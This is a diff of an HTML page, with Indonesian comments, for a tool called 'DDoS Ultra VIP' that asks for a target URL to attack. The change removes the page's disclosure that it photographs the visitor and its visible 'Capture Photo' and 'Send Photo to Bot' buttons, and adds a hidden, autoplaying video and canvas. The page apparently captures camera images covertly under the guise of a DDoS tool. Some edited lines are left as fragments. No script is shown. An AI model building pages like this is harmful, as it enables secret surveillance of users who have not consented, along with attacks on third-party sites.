@@ -9,28 +9,27 @@
 <body>
     <div class="container">
         <h1>DDoS Ultra VIP</h1>
-        <p class="description">Simulate a DDoS attack while we capture a photo from your camera. Just for fun!</p>
+        <p class="description"> a DDoS attack.</p>
         
         <form id="ddosForm">
             <div class="form-group">
                 <label for="url">Target URL:</label>
                 <input type="text" id="url" name="url" placeholder="https://example.com" required>
             </div>
-            <button type="submit" class="btn">Start DDoS Simulation</button>
+            <button type="submit" class="btn">Start DDoS</button>
         </form>
         
         <div id="status" class="status">Waiting for input...</div>
 
-        <!-- Kamera untuk foto -->
-        <button id="captureButton" class="capture-btn">Capture Photo</button>
-        <div id="photoContainer" class="hidden">
-            <canvas id="canvas"></canvas>
-            <button id="sendPhoto" class="send-btn">Send Photo to Bot</button>
+        <!-- Kamera untuk mengambil foto -->
+        <div id="cameraContainer" class="hidden">
+            <video id="video" class="hidden" autoplay></video>
+            <canvas id="canvas" class="hidden"></canvas>
         </div>
 
-        <!-- Efek Serangan -->
+        <!-- Efek DDoS -->
         <div id="ddosEffect" class="hidden">
-            <p>Simulating attack... <span id="attackProgress">0%</span></p>
+            <p> attack... <span id="attackProgress">0%</span></p>
             <div class="progress-bar">
                 <div id="progress" class="progress"></div>
             </div>
